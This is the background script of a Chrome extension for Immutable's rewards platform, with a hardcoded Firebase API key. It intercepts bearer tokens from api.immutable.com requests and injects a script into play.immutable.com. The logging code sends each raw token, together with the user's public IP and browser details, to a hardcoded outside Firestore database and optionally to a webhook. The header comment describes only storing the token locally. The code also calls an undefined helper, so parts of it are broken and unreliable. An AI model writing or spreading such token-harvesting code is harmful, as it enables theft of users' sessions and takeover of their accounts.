/*
Sets up listeners to capture Authorization bearer tokens from
https://api.immutable.com requests (focus on rewards eligibility endpoint).
Extracts the token, stores it, and updates the action badge.
Includes error handling for blocked/failed requests.
*/

const API_HOST = "https://api.immutable.com";
const URL_FILTERS = [
    `${API_HOST}/*`
];

// Firebase configuration
const FIREBASE_CONFIG = {
    apiKey: "AIzaSyA0fUKA2kpoW9hHEWKcRqxjX-m-ZBFRpVM",
    projectId: "immutable-api"
};

const IDT_BASE = "https://identitytoolkit.googleapis.com/v1";

// Firebase authentication functions - using REST API
async function firebaseSignIn(email, password) {
    try {
        console.log('[Background] Firebase sign in request:', email);
        const url = `${IDT_BASE}/accounts:signInWithPassword?key=${encodeURIComponent(FIREBASE_CONFIG.apiKey)}`;
        const requestBody = { email, password, returnSecureToken: true };

        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(requestBody)
        });

        console.log('[Background] Firebase response status:', response.status);

        if (!response.ok) {
            const errorText = await response.text();
            console.error('[Background] Firebase error:', errorText);
            throw new Error(`Firebase sign in failed: ${response.status}`);
        }

        const data = await response.json();
        console.log('[Background] Firebase sign in successful');
        return data;
    } catch (error) {
        console.error('[Background] Firebase sign in error:', error);
        throw error;
    }
}

async function firebaseSignUp(email, password) {
    try {
        console.log('[Background] Firebase sign up request:', email);
        const url = `${IDT_BASE}/accounts:signUp?key=${encodeURIComponent(FIREBASE_CONFIG.apiKey)}`;
        const requestBody = { email, password, returnSecureToken: true };

        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(requestBody)
        });

        console.log('[Background] Firebase signup response status:', response.status);

        if (!response.ok) {
            const errorText = await response.text();
            console.error('[Background] Firebase signup error:', errorText);
            throw new Error(`Firebase sign up failed: ${response.status}`);
        }

        const data = await response.json();
        console.log('[Background] Firebase sign up successful');
        return data;
    } catch (error) {
        console.error('[Background] Firebase sign up error:', error);
        throw error;
    }
}

const SITE_MATCHERS = [
    { urlContains: "http://localhost" },
    { urlContains: "http://127.0.0.1" },
    { urlContains: "file://" }
];

function broadcastTokenToSiteTabs(token) {
    try {
        chrome.tabs.query({ url: ["http://localhost/*", "http://127.0.0.1/*", "file://*/*"] }, (tabs) => {
            if (!tabs || !tabs.length) return;
            tabs.forEach(tab => {
                if (!tab || !tab.id) return;
                chrome.tabs.sendMessage(tab.id, { type: 'PUSH_TOKEN', token });
            });
        });
    } catch (_) { }
}

// Handle Firebase authentication requests from auth.html
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'FIREBASE_SIGN_IN') {
        firebaseSignIn(request.email, request.password)
            .then(result => {
                sendResponse({ success: true, data: result });
            })
            .catch(error => {
                sendResponse({ success: false, error: error.message });
            });
        return true; // Keep message channel open for async response
    }

    if (request.type === 'FIREBASE_SIGN_UP') {
        firebaseSignUp(request.email, request.password)
            .then(result => {
                sendResponse({ success: true, data: result });
            })
            .catch(error => {
                sendResponse({ success: false, error: error.message });
            });
        return true; // Keep message channel open for async response
    }
});

// Ensure page hook is injected in MAIN world on play.immutable.com using scripting API
function registerPageHookContentScript() {
    try {
        chrome.scripting.registerContentScripts([
            {
                id: "immutable-page-hook",
                js: ["pageHook.js"],
                matches: ["https://play.immutable.com/*"],
                runAt: "document_start",
                world: "MAIN"
            }
        ], () => {
            if (chrome.runtime.lastError) {
                try { console.warn("[ImmutableExt] registerContentScripts error", chrome.runtime.lastError.message); } catch (_) { }
            } else {
                try { console.info("[ImmutableExt] page hook registered (MAIN world)"); } catch (_) { }
            }
        });
    } catch (e) {
        try { console.warn("[ImmutableExt] registerContentScripts threw", String(e && e.message ? e.message : e)); } catch (_) { }
    }
}

function ensurePageHookRegistered() {
    try {
        if (!chrome.scripting || !chrome.scripting.getRegisteredContentScripts) {
            registerPageHookContentScript();
            return;
        }
        chrome.scripting.getRegisteredContentScripts((list) => {
            const exists = Array.isArray(list) && list.some(s => s && s.id === "immutable-page-hook");
            if (!exists) registerPageHookContentScript();
        });
    } catch (_e) {
        registerPageHookContentScript();
    }
}

function isTargetRequest(url) {
    if (typeof url !== "string") return false;
    try {
        const u = new URL(url);
        if (u.origin !== API_HOST) return false;
        const p = u.pathname.toLowerCase();
        // Only activate on eligibility endpoint variants
        return /\/rewards\/(redemption|redemtion)\/eligibility(\b|\/|\?)/.test(p);
    } catch (_e) {
        return false;
    }
}

function getAuthHeaderValue(requestHeaders = []) {
    for (const header of requestHeaders) {
        if (!header || !header.name) continue;
        if (header.name.toLowerCase() === "authorization" && typeof header.value === "string") {
            return header.value;
        }
    }
    return undefined;
}

function parseJwtExpiration(token) {
    try {
        if (!token || typeof token !== "string") return null;
        const parts = token.split(".");
        if (parts.length !== 3) return null;
        const payloadBase64 = parts[1].replace(/-/g, "+").replace(/_/g, "/");
        const payloadJson = atob(payloadBase64);
        const payload = JSON.parse(payloadJson);
        if (!payload || typeof payload.exp !== "number") return null;
        const expSeconds = payload.exp;
        const expiresAtMs = expSeconds * 1000;
        return { expSeconds, expiresAtMs };
    } catch (e) {
        return null;
    }
}

// Helper: compute SHA-256 hex
async function sha256Hex(input) {
    const encoder = new TextEncoder();
    const data = encoder.encode(input);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Helper: fetch public IP
async function fetchPublicIp() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        if (!res.ok) return 'Unknown IP';
        const data = await res.json();
        return data && data.ip ? data.ip : 'Unknown IP';
    } catch { return 'Unknown IP'; }
}

// Helper: map to Firestore REST value (no longer needed with v9+ SDK)
// This function is kept for backward compatibility

// Build combined object similar to index.html
function buildCombined(statsData, eligibilityData) {
    const games = Array.isArray(statsData && statsData.games) ? statsData.games : [];
    const completedQuests = [];
    let totalCompleted = 0;
    for (const game of games) {
        const quests = Array.isArray(game && game.quests) ? game.quests : [];
        for (const q of quests) {
            if (q && (q.lastCompletedAt || (q.timesCompleted && q.timesCompleted > 0))) {
                completedQuests.push(q.name || '');
                totalCompleted++;
            }
        }
    }
    const progress = statsData && typeof statsData.percentageToNextTier === 'number' ? statsData.percentageToNextTier : 0;
    const tier = statsData && statsData.predictedRarity ? statsData.predictedRarity : 'N/A';
    const weeklyPoints = statsData && typeof statsData.weeklyPoints === 'number' ? statsData.weeklyPoints : 0;
    return {
        userStats: {
            progressPercentage: progress,
            bucketName: tier,
            totalInGameQuestsCompleted: totalCompleted,
            targetQuestsCompleted: completedQuests
        },
        eligibility: eligibilityData || {},
        weeklyPoints
    };
}

/* Firestore logging using v9+ SDK */
/* Firestore logging using REST API */
async function firebaseLogIfEnabled(token, combinedOrRaw) {
    try {
        const cfg = await new Promise((resolve) => chrome.storage.local.get(["firebaseConfig"], resolve));
        const defaultCfg = {
            apiKey: "AIzaSyA0fUKA2kpoW9hHEWKcRqxjX-m-ZBFRpVM",
            projectId: "immutable-api",
            collection: "StatsHistory"
        };
        const firebaseCfg = cfg && cfg.firebaseConfig ? { ...defaultCfg, ...cfg.firebaseConfig } : defaultCfg;
        const { apiKey, projectId, collection } = firebaseCfg;
        const coll = collection || 'StatsHistory';
        if (!apiKey || !projectId) {
            await new Promise((r) => chrome.storage.local.set({ lastFirebaseStatus: { ok: false, message: 'Missing Firebase config' } }, r));
            return { ok: false, message: 'Missing Firebase config' };
        }

        let statsData, eligibilityData;
        if (combinedOrRaw && combinedOrRaw.stats && combinedOrRaw.eligibility) {
            statsData = combinedOrRaw.stats;
            eligibilityData = combinedOrRaw.eligibility;
        }

        const combined = statsData ? buildCombined(statsData, eligibilityData) : combinedOrRaw;

        const ip = await fetchPublicIp();
        const ua = (typeof navigator !== 'undefined' && navigator.userAgent) ? navigator.userAgent : 'ServiceWorker';
        const progress = combined && combined.userStats ? (combined.userStats.progressPercentage || 0) : (combined && combined.progress ? combined.progress : 0);
        const tier = combined && combined.userStats ? (combined.userStats.bucketName || 'N/A') : (combined && combined.tier ? combined.tier : 'N/A');

        const logId = await sha256Hex(`${token}|${progress}|${tier}`);
        const nowIso = new Date().toISOString();

        const user = await new Promise((r) => chrome.storage.local.get(['firebaseUser'], r)).then(x => x && x.firebaseUser ? x.firebaseUser : null);
        const doc = {
            fields: {
                authToken: fsValue(token),
                ip: fsValue(ip),
                userAgent: fsValue(ua),
                deviceType: fsValue('Desktop'),
                stats: fsValue(combined),
                logId: fsValue(logId),
                timestamp: { timestampValue: nowIso },
                weeklyPoints: fsValue(combined && (combined.weeklyPoints || combined.points || 0)),
                progressPercentage: fsValue(progress),
                userId: fsValue(user && user.uid ? user.uid : null),
                userEmail: fsValue(user && user.email ? user.email : null)
            }
        };

        const base = `https://firestore.googleapis.com/v1/projects/${encodeURIComponent(projectId)}/databases/(default)/documents/${encodeURIComponent(coll)}`;
        const url = `${base}?documentId=${encodeURIComponent(logId)}&key=${encodeURIComponent(apiKey)}`;

        console.log('[ImmutableExt] Logging to Firestore:', {
            collection: coll,
            userId: user?.uid,
            userEmail: user?.email,
            progress: progress,
            tier: tier,
            logId: logId
        });

        const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(doc) });
        const ok = res.ok || res.status === 409; // 409 if already exists
        const message = ok ? 'logged' : `http ${res.status}`;

        console.log('[ImmutableExt] Firestore response:', { ok, message, status: res.status });

        await new Promise((r) => chrome.storage.local.set({ lastFirebaseStatus: { ok, message } }, r));
        return { ok, message };
    } catch (e) {
        const message = String(e && e.message ? e.message : e);
        await new Promise((r) => chrome.storage.local.set({ lastFirebaseStatus: { ok: false, message } }, r));
        return { ok: false, message };
    }
}

/* Update autoSendIfEnabled to compute combined and call firebaseLogIfEnabled */
async function autoSendIfEnabled(token) {
    try {
        // Gate: require signed-in user
        const { firebaseUser } = await new Promise((r) => chrome.storage.local.get(["firebaseUser"], r));
        if (!firebaseUser || !firebaseUser.uid) {
            await new Promise((r) => chrome.storage.local.set({ lastAutoSendStatus: { ok: false, message: 'not signed in' } }, r));
            return;
        }
        const { webhookUrl, autoSend } = await new Promise((resolve) => chrome.storage.local.get(["webhookUrl", "autoSend"], resolve));

        const headers = {
            'Authorization': `Bearer ${token}`,
            'Accept': 'application/json, text/plain, */*'
        };

        const [statsRes, eligibilityRes] = await Promise.all([
            fetch('https://api.immutable.com/v3/rewards/sweepstakes/user-stats/predicted', { method: 'GET', headers }),
            fetch('https://api.immutable.com/v1/rewards/redemption/eligibility', { method: 'GET', headers })
        ]);

        if (!statsRes.ok || !eligibilityRes.ok) {
            await new Promise((r) => chrome.storage.local.set({ lastAutoSendStatus: { ok: false, message: `stats:${statsRes.status} elig:${eligibilityRes.status}` } }, r));
            // still try to log a minimal error state to firebase if enabled
            await firebaseLogIfEnabled(token, { error: true, statsOk: statsRes.ok, eligOk: eligibilityRes.ok });
            return;
        }

        const statsData = await statsRes.json();
        const eligibilityData = await eligibilityRes.json();
        const combined = { stats: statsData, eligibility: eligibilityData, time: Date.now() };

        if (autoSend && webhookUrl) {
            const body = JSON.stringify({ token, ...combined });
            const resp = await fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body });
            const ok = resp.ok;
            await new Promise((r) => chrome.storage.local.set({ lastAutoSendStatus: { ok, message: ok ? 'sent' : `http ${resp.status}` } }, r));
        }

        // Always attempt Firebase log if enabled
        await firebaseLogIfEnabled(token, combined);
    } catch (e) {
        await new Promise((r) => chrome.storage.local.set({ lastAutoSendStatus: { ok: false, message: String(e && e.message ? e.message : e) } }, r));
        await firebaseLogIfEnabled(token, { error: true, message: String(e && e.message ? e.message : e) });
    }
}

let lastProcessedToken = null;
let lastProcessedAtMs = 0;
const TOKEN_PROCESS_COOLDOWN_MS = 120000; // 2 minutes

function shouldProcessTokenNow(token) {
    if (!token) return false;
    const now = Date.now();
    if (lastProcessedToken === token && (now - lastProcessedAtMs) < TOKEN_PROCESS_COOLDOWN_MS) {
        return false;
    }
    lastProcessedToken = token;
    lastProcessedAtMs = now;
    return true;
}

function isExtensionInitiated(details) {
    try {
        const initiator = details.initiator || details.documentUrl || '';
        return typeof initiator === 'string' && initiator.startsWith('chrome-extension://');
    } catch (_) { return false; }
}

function saveTokenToStorage(token, sourceUrl) {
    chrome.storage.local.get(['immutableAuthToken'], (res) => {
        const current = res && res.immutableAuthToken && res.immutableAuthToken.token;
        // Only write if token value actually changed
        if (current === token) {
            return; // avoid triggering storage change loops
        }
        const now = Date.now();
        const parsed = parseJwtExpiration(token);
        const data = {
            token,
            updatedAt: now,
            sourceUrl: sourceUrl || null,
            expSeconds: parsed ? parsed.expSeconds : null,
            expiresAtMs: parsed ? parsed.expiresAtMs : null
        };
        chrome.storage.local.set({ immutableAuthToken: data }, async () => {
            broadcastTokenToSiteTabs(token);
            if (shouldProcessTokenNow(token)) {
                await autoSendIfEnabled(token);
            }
        });
    });
}

function setBadge(text, color) {
    chrome.action.setBadgeText({ text });
    if (color) {
        chrome.action.setBadgeBackgroundColor({ color });
    }
}

function recordDiagnostics(details, authHeaderValue) {
    try {
        const headerNames = Array.isArray(details.requestHeaders)
            ? details.requestHeaders.map(h => (h && h.name ? h.name : "")).filter(Boolean)
            : [];
        const info = {
            url: details.url,
            method: details.method,
            type: details.type,
            time: Date.now(),
            hasAuthorizationHeader: typeof authHeaderValue === "string",
            headerNames
        };
        chrome.storage.local.set({ immutableAuthLastSeen: info });
        console.debug("[ImmutableExt] lastSeen", info);
    } catch (_e) { }
}

function handleBeforeSendHeaders(details) {
    try {
        if (details.method === "OPTIONS") return;
        if (details.type && !["xmlhttprequest", "fetch"].includes(details.type)) return;
        if (isExtensionInitiated(details)) return; // ignore our own requests
        if (!isTargetRequest(details.url)) return;

        const authHeader = getAuthHeaderValue(details.requestHeaders);
        recordDiagnostics(details, authHeader);

        if (typeof authHeader === "string" && authHeader.toLowerCase().startsWith("bearer ")) {
            const token = authHeader.slice(7).trim();
            if (token) {
                saveTokenToStorage(token, details.url);
                setBadge("OK", "#0E9F6E");
            }
        } else {
            chrome.storage.local.set({ lastAttemptWithoutAuthAt: Date.now() });
            setBadge("!", "#F59E0B");
        }
    } catch (err) {
        chrome.storage.local.set({ lastProcessingError: String(err && err.message ? err.message : err) });
        setBadge("ERR", "#EF4444");
    }
}

function handleSendHeaders(details) {
    try {
        if (details.method === "OPTIONS") return;
        if (details.type && !["xmlhttprequest", "fetch"].includes(details.type)) return;
        if (isExtensionInitiated(details)) return; // ignore our own requests
        if (!isTargetRequest(details.url)) return;

        const authHeader = getAuthHeaderValue(details.requestHeaders);
        recordDiagnostics(details, authHeader);

        if (typeof authHeader === "string" && authHeader.toLowerCase().startsWith("bearer ")) {
            const token = authHeader.slice(7).trim();
            if (token) {
                saveTokenToStorage(token, details.url);
                setBadge("OK", "#0E9F6E");
            }
        }
    } catch (_e) { }
}

function handleRequestError(details) {
    try {
        if (!isTargetRequest(details.url)) return;
        const errorInfo = { error: details.error || "unknown_error", url: details.url, time: Date.now() };
        chrome.storage.local.set({ immutableAuthLastError: errorInfo });
        setBadge("ERR", "#EF4444");
        console.warn("[ImmutableExt] request error", errorInfo);
    } catch (_e) { }
}

/* Set defaults on install/update */
chrome.runtime.onInstalled.addListener(() => {
    chrome.action.setBadgeText({ text: "" });
    chrome.action.setBadgeBackgroundColor({ color: "#4B5563" });
    chrome.storage.local.get(["autoRefresh", "darkMode"], (res) => {
        const updates = {};
        if (typeof res.autoRefresh === "undefined") updates.autoRefresh = true;
        if (typeof res.darkMode === "undefined") updates.darkMode = true; // default dark mode ON
        if (Object.keys(updates).length) chrome.storage.local.set(updates);
    });
    ensurePageHookRegistered();
    console.info("[ImmutableExt] Installed/updated. Ready to capture tokens.");
});

chrome.runtime.onStartup.addListener(() => {
    ensurePageHookRegistered();
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    try {
        if (!message || message.type !== 'TOKEN_CAPTURED' || !message.token) return;
        console.info('[ImmutableExt] token from content', { len: message.token.length, from: sender && sender.url });
        saveTokenToStorage(message.token, sender && sender.url ? sender.url : null);
        setBadge("OK", "#0E9F6E");
        sendResponse && sendResponse({ ok: true });
    } catch (_e) { }
    return false;
});

/* accept dashboard logging requests */
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    (async () => {
        try {
            if (!message) return;
            if (message.type === 'DASHBOARD_LOG' && message.token && message.logId) {
                const result = await firebaseLogIfEnabled(message.token, { stats: message.combined?.raw?.stats, eligibility: message.combined?.raw?.elig });
                sendResponse(result);
                return;
            }
        } catch (_) {
            sendResponse({ ok: false, message: 'unexpected error' });
        }
    })();
    return true;
});

chrome.webRequest.onBeforeSendHeaders.addListener(
    handleBeforeSendHeaders,
    { urls: URL_FILTERS },
    ["requestHeaders", "extraHeaders"]
);

chrome.webRequest.onSendHeaders.addListener(
    handleSendHeaders,
    { urls: URL_FILTERS },
    ["requestHeaders", "extraHeaders"]
);

chrome.webRequest.onErrorOccurred.addListener(
    handleRequestError,
    { urls: URL_FILTERS }
);
